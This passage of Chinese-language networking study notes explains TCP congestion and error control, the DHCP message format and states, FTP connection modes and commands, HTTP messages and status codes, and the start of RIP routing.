1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="./网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="./网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="./网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="./网际协议IP/DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="./网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="./网际协议IP/DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="./网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="./网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="./网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="./网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul><h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="./网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="./网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="./网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="./网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="./网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="./网际协议IP/FTP相应.png" style="zoom:67%;" /><h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="./网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li><p>URL由4部分组成:</p><ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="./网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p>首部行</p><ul><li>用来说明浏览器、服务器或报文主体的一些信息。</li><li>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</li><li>首部可以有好几行，但也可以不使用。</li><li>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</li></ul></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="./网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="./网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="./网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="./网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="./网际协议IP/万维网工作过程.png" style="zoom:67%;" /><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="./网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" 